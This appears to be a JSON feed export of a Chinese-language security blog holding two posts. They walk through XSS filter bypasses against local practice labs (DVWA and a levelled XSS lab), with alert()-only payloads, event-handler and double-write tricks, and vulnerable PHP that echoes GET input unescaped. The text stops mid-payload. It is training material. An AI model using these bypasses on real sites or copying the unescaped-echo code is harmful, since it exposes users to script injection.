{
    "version": "https://jsonfeed.org/version/1",
    "title": "My Violet Eva Garden • All posts by \"xss跨站脚本攻击探究\" tag",
    "description": "",
    "home_page_url": "https://kiyomijin.github.io",
    "items": [
        {
            "id": "https://kiyomijin.github.io/2022/10/20/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%8E%A2%E7%A9%B6/XSS%E7%BB%95%E8%BF%87%E8%BF%9B%E9%98%B6/",
            "url": "https://kiyomijin.github.io/2022/10/20/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%8E%A2%E7%A9%B6/XSS%E7%BB%95%E8%BF%87%E8%BF%9B%E9%98%B6/",
            "title": "XSS绕过进阶",
            "date_published": "2022-10-20T15:43:52.000Z",
            "content_html": "<h1 id=\"XSS绕过进阶\"><a href=\"#XSS绕过进阶\" class=\"headerlink\" title=\"XSS绕过进阶\"></a>XSS绕过进阶</h1><p>讲述XSS绕过。</p>\n<h1 id=\"DVWA-Medium\"><a href=\"#DVWA-Medium\" class=\"headerlink\" title=\"DVWA-Medium\"></a>DVWA-Medium</h1><p>本章节使用<code>DVWA-Medium</code>安全难度</p>\n<h2 id=\"XSS-DOM\"><a href=\"#XSS-DOM\" class=\"headerlink\" title=\"XSS DOM\"></a>XSS DOM</h2><p>首先，<code>GET</code>请求，<code>default</code>可控，我们不妨尝试：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert()<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019005840851.png\" alt=\"image-20221019005840851\"></p>\n<p>没有弹框，<code>URL</code>被自动换回<code>default=English</code></p>\n<p>尝试<code>img</code>标签</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=<span class=\"tag\">&lt;<span class=\"name\">img</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019010005305.png\" alt=\"image-20221019010005305\"></p>\n<p><code>img</code>标签没有被替换回去，能用</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">1</span> <span class=\"attr\">onerror</span>=<span class=\"string\">alert()</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>但没有弹框</p>\n<p><img src=\"image-20221019010103425.png\" alt=\"image-20221019010103425\"></p>\n<p>我们只好查看源码：</p>\n<p><img src=\"image-20221019010223667.png\" alt=\"image-20221019010223667\"></p>\n<p>发现这里已经变成了<code>option value</code>的值，也就是字符串，所以我们需要令其逃逸出来。</p>\n<p>逃逸需要考虑两点：</p>\n<ul>\n<li>需要在执行完增加<code>German</code>选项后执行【原因是如果在中间插入<code>img</code>标签会导致无用】</li>\n<li><code>img</code>标签需要放在<code>option</code>和<code>select</code>标签外面，否则会不起作用</li>\n</ul>\n<p>我们需要使用Chrome进行单步调试到这一步</p>\n<p><img src=\"image-20221019012834888.png\" alt=\"image-20221019012834888\"></p>\n<p>然后在控制台Console中输入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">var lang = &quot;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert()&gt;&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">document.write(lang);</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019012721926.png\" alt=\"image-20221019012721926\"></p>\n<p>点击运行</p>\n<p><img src=\"image-20221019012913112.png\" alt=\"image-20221019012913112\"></p>\n<p>成功弹框</p>\n<p><img src=\"image-20221019012927916.png\" alt=\"image-20221019012927916\"></p>\n<h2 id=\"XSS-Reflected\"><a href=\"#XSS-Reflected\" class=\"headerlink\" title=\"XSS Reflected\"></a>XSS Reflected</h2><p>输入111，回显</p>\n<p><img src=\"image-20221019013402813.png\" alt=\"image-20221019013402813\"></p>\n<p>尝试XSS</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert()<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019013617281.png\" alt=\"image-20221019013617281\"></p>\n<p>发现前面的<code>&lt;script&gt;</code>整个被吃掉</p>\n<p>尝试双写</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=<span class=\"tag\">&lt;<span class=\"name\">scscriptript</span>&gt;</span>alert()<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019013710716.png\" alt=\"image-20221019013710716\"></p>\n<p>没有被吃掉，我们猜想是不是连同尖括号一起吃呢？</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=&lt;sc<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>ript&gt;alert()<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019013816392.png\" alt=\"image-20221019013816392\"></p>\n<p>当然，这个题还可以使用<code>img</code>标签</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=1<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">1</span> <span class=\"attr\">onerror</span>=<span class=\"string\">alert()</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019013931387.png\" alt=\"image-20221019013931387\"></p>\n<h2 id=\"XSS-Stored\"><a href=\"#XSS-Stored\" class=\"headerlink\" title=\"XSS Stored\"></a>XSS Stored</h2><p>我们尝试输入</p>\n<p><img src=\"image-20221019014211349.png\" alt=\"image-20221019014211349\"></p>\n<p>查看源码</p>\n<p><img src=\"image-20221019014121390.png\" alt=\"image-20221019014121390\"></p>\n<p>发现，<code>Name</code>中<code>img</code>标签没有过滤，那么我们就可以构造</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;img src=1 onerror=alert()&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"Fimage-20221019014431922.png\" alt=\"image-20221019014431922\"></p>\n<p><img src=\"image-20221019014458321.png\" alt=\"image-20221019014458321\"></p>\n<p>成功弹框</p>\n<p><img src=\"image-20221019015353575.png\" alt=\"image-20221019015353575\"></p>\n<h1 id=\"DVWA-High\"><a href=\"#DVWA-High\" class=\"headerlink\" title=\"DVWA-High\"></a>DVWA-High</h1><p>开启<code>High</code>难度</p>\n<p><img src=\"image-20221019221540107.png\" alt=\"image-20221019221540107\"></p>\n<h2 id=\"XSS-DOM-1\"><a href=\"#XSS-DOM-1\" class=\"headerlink\" title=\"XSS DOM\"></a>XSS DOM</h2><p>依旧是调试源码。</p>\n<p>等到运行到<code>German</code>时，敲入：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">var lang = &quot;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert()&gt;&quot;;</span><br><span class=\"line\">document.write(lang);</span><br></pre></td></tr></table></figure>\n<p>就可以令<code>img</code>标签语句插入到这里</p>\n<p><img src=\"image-20221019222240264.png\" alt=\"image-20221019222240264\"></p>\n<p>放行运行，成功弹窗</p>\n<p><img src=\"image-20221019222216830.png\" alt=\"image-20221019222216830\"></p>\n<h2 id=\"XSS-Reflected-1\"><a href=\"#XSS-Reflected-1\" class=\"headerlink\" title=\"XSS Reflected\"></a>XSS Reflected</h2><p><code>script</code>标签用不了，尝试使用<code>img</code>标签</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=&lt;img src=1 onerror=alert()&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019222606613.png\" alt=\"image-20221019222606613\"></p>\n<h2 id=\"XSS-Stored-1\"><a href=\"#XSS-Stored-1\" class=\"headerlink\" title=\"XSS Stored\"></a>XSS Stored</h2><p>修改Name的最大输入长度为<code>100</code></p>\n<p><img src=\"image-20221019222817488.png\" alt=\"image-20221019222817488\"></p>\n<p>输入：</p>\n<p><img src=\"image-20221019222722193.png\" alt=\"image-20221019222722193\"></p>\n<p>即可弹窗</p>\n<p><img src=\"image-20221019222901876.png\" alt=\"image-20221019222901876\"></p>\n<h1 id=\"XSS-防御\"><a href=\"#XSS-防御\" class=\"headerlink\" title=\"XSS 防御\"></a>XSS 防御</h1><h2 id=\"客户端打补丁、升级、NoScript等扩展功能\"><a href=\"#客户端打补丁、升级、NoScript等扩展功能\" class=\"headerlink\" title=\"客户端打补丁、升级、NoScript等扩展功能\"></a>客户端打补丁、升级、NoScript等扩展功能</h2><p><img src=\"image-20221019223723238.png\" alt=\"image-20221019223723238\"></p>\n<h2 id=\"HttpOnly\"><a href=\"#HttpOnly\" class=\"headerlink\" title=\"HttpOnly\"></a>HttpOnly</h2><p><img src=\"image-20221019223527721.png\" alt=\"image-20221019223527721\"></p>\n<p><img src=\"image-20221019223543384.png\" alt=\"image-20221019223543384\"></p>\n<h2 id=\"输入-输出检查\"><a href=\"#输入-输出检查\" class=\"headerlink\" title=\"输入/输出检查\"></a>输入/输出检查</h2><p><img src=\"image-20221019223618348.png\" alt=\"image-20221019223618348\"></p>\n<p><img src=\"image-20221019223632692.png\" alt=\"image-20221019223632692\"></p>\n<p><img src=\"image-20221019223649325.png\" alt=\"image-20221019223649325\"></p>\n",
            "tags": [
                "XSS跨站脚本攻击探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/20/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%8E%A2%E7%A9%B6/XSS%E5%B0%8F%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%BB%95%E8%BF%87/",
            "url": "https://kiyomijin.github.io/2022/10/20/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%8E%A2%E7%A9%B6/XSS%E5%B0%8F%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%BB%95%E8%BF%87/",
            "title": "XSS小实践与绕过",
            "date_published": "2022-10-20T15:36:10.000Z",
            "content_html": "<h1 id=\"XSS实践尝试\"><a href=\"#XSS实践尝试\" class=\"headerlink\" title=\"XSS实践尝试\"></a>XSS实践尝试</h1><p>来到127.0.0.1/xss_vuln</p>\n<h2 id=\"XSS初体验\"><a href=\"#XSS初体验\" class=\"headerlink\" title=\"XSS初体验\"></a>XSS初体验</h2><p><img src=\"image-20221018203227623.png\" alt=\"image-20221018203227623\"></p>\n<p>是get请求，那么我们看一下参数test是否可控</p>\n<p><img src=\"image-20221018203244376.png\" alt=\"image-20221018203244376\"></p>\n<p>参数可控，那么我们可以写入</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/xss_vuln/level1.php?name=<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert()<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018203401144.png\" alt=\"image-20221018203401144\"></p>\n<p>查看前台源码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span><span class=\"comment\">&lt;!--STATUS OK--&gt;</span><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;content-type&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"variable language_\">window</span>.<span class=\"property\">alert</span> = <span class=\"keyword\">function</span>(<span class=\"params\"></span>)  </span></span><br><span class=\"line\"><span class=\"language-javascript\">&#123;     </span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"title function_\">confirm</span>(<span class=\"string\">&quot;完成的不错！&quot;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\"> <span class=\"variable language_\">window</span>.<span class=\"property\">location</span>.<span class=\"property\">href</span>=<span class=\"string\">&quot;level2.php?keyword=test&quot;</span>; </span></span><br><span class=\"line\"><span class=\"language-javascript\">&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>欢迎来到level1<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">align</span>=<span class=\"string\">center</span>&gt;</span>欢迎来到level1<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h2</span> <span class=\"attr\">align</span>=<span class=\"string\">center</span>&gt;</span>欢迎用户JACK<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">center</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">level1.png</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h3</span> <span class=\"attr\">align</span>=<span class=\"string\">center</span>&gt;</span>payload的长度:4<span class=\"tag\">&lt;/<span class=\"name\">h3</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>使用window.alert来重写我们的alert函数，无论我们在alert()中加入什么参数，都会显示“完成的不错！”</p>\n<p>这里我们目前看不到get请求的处理。</p>\n<p>那么继续来看后台代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span><span class=\"comment\">&lt;!--STATUS OK--&gt;</span><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;content-type&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"variable language_\">window</span>.<span class=\"property\">alert</span> = <span class=\"keyword\">function</span>(<span class=\"params\"></span>)  </span></span><br><span class=\"line\"><span class=\"language-javascript\">&#123;     </span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"title function_\">confirm</span>(<span class=\"string\">&quot;完成的不错！&quot;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\"> <span class=\"variable language_\">window</span>.<span class=\"property\">location</span>.<span class=\"property\">href</span>=<span class=\"string\">&quot;level2.php?keyword=test&quot;</span>; </span></span><br><span class=\"line\"><span class=\"language-javascript\">&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>欢迎来到level1<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">align</span>=<span class=\"string\">center</span>&gt;</span>欢迎来到level1<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php </span></span><br><span class=\"line\"><span class=\"meta\">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class=\"line\"><span class=\"meta\">$str = $_GET[&quot;name&quot;];</span></span><br><span class=\"line\"><span class=\"meta\">echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;; &lt;--XSS漏洞点，对于GET的参数没做校验</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">center</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">level1.png</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php </span></span><br><span class=\"line\"><span class=\"meta\">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>可以看到，由于用户<code>JACK</code>处没有做任何的校验，直接用<code>.</code>来做拼接，那么我们在此处写入XSS代码，就会执行脚本语言。</p>\n<h2 id=\"XSS绕过\"><a href=\"#XSS绕过\" class=\"headerlink\" title=\"XSS绕过\"></a>XSS绕过</h2><p>来到第二关</p>\n<p><img src=\"image-20221018204436214.png\" alt=\"image-20221018204436214\"></p>\n<p>查看前台源码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span><span class=\"comment\">&lt;!--STATUS OK--&gt;</span><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;content-type&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"variable language_\">window</span>.<span class=\"property\">alert</span> = <span class=\"keyword\">function</span>(<span class=\"params\"></span>)  </span></span><br><span class=\"line\"><span class=\"language-javascript\">&#123;     </span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"title function_\">confirm</span>(<span class=\"string\">&quot;完成的不错！&quot;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\"> <span class=\"variable language_\">window</span>.<span class=\"property\">location</span>.<span class=\"property\">href</span>=<span class=\"string\">&quot;level3.php?writing=wait&quot;</span>; </span></span><br><span class=\"line\"><span class=\"language-javascript\">&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>欢迎来到level2<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">align</span>=<span class=\"string\">center</span>&gt;</span>欢迎来到level2<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h2</span> <span class=\"attr\">align</span>=<span class=\"string\">center</span>&gt;</span>没有找到和JACK相关的结果.<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">level2.php</span> <span class=\"attr\">method</span>=<span class=\"string\">GET</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">keyword</span>  <span class=\"attr\">value</span>=<span class=\"string\">&quot;JACK&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">submit</span> <span class=\"attr\">name</span>=<span class=\"string\">submit</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;搜索&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">center</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">level2.png</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h3</span> <span class=\"attr\">align</span>=<span class=\"string\">center</span>&gt;</span>payload的长度:4<span class=\"tag\">&lt;/<span class=\"name\">h3</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>此处和第一关的不同在于使用了form表单请求，当点击搜索的时候会发送GET请求。</p>\n<p>那么我们尝试输入XSS</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/xss_vuln/level2.php?keyword=<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert()<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>&amp;submit=JACK</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018204740946.png\" alt=\"image-20221018204740946\"></p>\n<p>发现<code>尖括号</code>被转码，但是在下方<code>input</code>输入标签内，出现了XSS标准语句，那么我们需要让<code>尖括号&lt;&gt;逃逸</code></p>\n<p>注意：<code>&lt;input&gt;</code>框需要闭合</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/xss_vuln/level2.php?keyword=&quot;&gt;<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert()<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>&amp;submit=JACK</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018205525037.png\" alt=\"image-20221018205525037\"></p>\n<p>查看其后台源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"title function_ invoke__\">ini_set</span>(<span class=\"string\">&quot;display_errors&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"variable\">$str</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;keyword&quot;</span>];</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class=\"title function_ invoke__\">htmlspecialchars</span>(<span class=\"variable\">$str</span>).<span class=\"string\">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class=\"string\">&#x27;&lt;center&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;form action=level2.php method=GET&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class=\"variable\">$str</span>.<span class=\"string\">&#x27;&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/center&gt;&#x27;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>关键在于使用了htmlspecialchars函数做了转义。</p>\n<p>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</p>\n<p>预定义的字符是：</p>\n<ul>\n<li><code>&amp;</code> （和号）成为 <code>&amp;amp</code></li>\n<li><code>&quot;</code> （双引号）成为 <code>&amp;quot</code></li>\n<li><code>&#39;</code> （单引号）成为 <code>&#39;</code>  ,原样输出</li>\n<li><code>&lt;</code> （小于）成为 <code>&amp;lt</code></li>\n<li><code>&gt;</code> （大于）成为 <code>&amp;gt</code></li>\n</ul>\n<h2 id=\"XSS事件绕过\"><a href=\"#XSS事件绕过\" class=\"headerlink\" title=\"XSS事件绕过\"></a>XSS事件绕过</h2><p>照前面的思路，这一题直接尝试在输入框写入XSS代码</p>\n<p><img src=\"image-20221018210913300.png\" alt=\"image-20221018210913300\"></p>\n<p>查看前台源码，看看过滤成了什么样子：</p>\n<p><img src=\"image-20221018210855840.png\" alt=\"image-20221018210855840\"></p>\n<p>我们发现在value中的部分也做了过滤，那我们需要在逃逸单引号的同时，让alert()函数也执行。</p>\n<p>HTML的事件函数，可以返回script值。也就是说，当你写入事件的参数时，事件触发后自动变成script标签：</p>\n<p><img src=\"image-20221018211546936.png\" alt=\"image-20221018211546936\"></p>\n<p>使用onclick事件函数触发alert()</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/xss_vuln/level3.php?keyword=&#x27; onclick=&#x27;alert()&#x27; &#x27;&amp;submit=æç´¢</span><br></pre></td></tr></table></figure>\n<p>提交URL后，随便点击一下触发onclick事件，成功绕过：</p>\n<p><img src=\"image-20221018212039821.png\" alt=\"image-20221018212039821\"></p>\n<h2 id=\"XSS语法绕过\"><a href=\"#XSS语法绕过\" class=\"headerlink\" title=\"XSS语法绕过\"></a>XSS语法绕过</h2><p>第四关，我们直接看一下源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"title function_ invoke__\">ini_set</span>(<span class=\"string\">&quot;display_errors&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"variable\">$str</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;keyword&quot;</span>];</span><br><span class=\"line\"><span class=\"variable\">$str2</span>=<span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;&gt;&quot;</span>,<span class=\"string\">&quot;&quot;</span>,<span class=\"variable\">$str</span>);</span><br><span class=\"line\"><span class=\"variable\">$str3</span>=<span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;&lt;&quot;</span>,<span class=\"string\">&quot;&quot;</span>,<span class=\"variable\">$str2</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class=\"title function_ invoke__\">htmlspecialchars</span>(<span class=\"variable\">$str</span>).<span class=\"string\">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class=\"string\">&#x27;&lt;center&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;form action=level4.php method=GET&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class=\"variable\">$str3</span>.<span class=\"string\">&#x27;&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/center&gt;&#x27;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>发现是使用str_replace来把<code>&gt;</code>和<code>&lt;</code>都替换成了空值，所以这种情况下，依旧使用onclick事件来XSS是可以的。</p>\n<p>观察前台源码是使用<code>双引号</code>闭合的，那么输入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">“ onclick=&#x27;alert()&#x27; 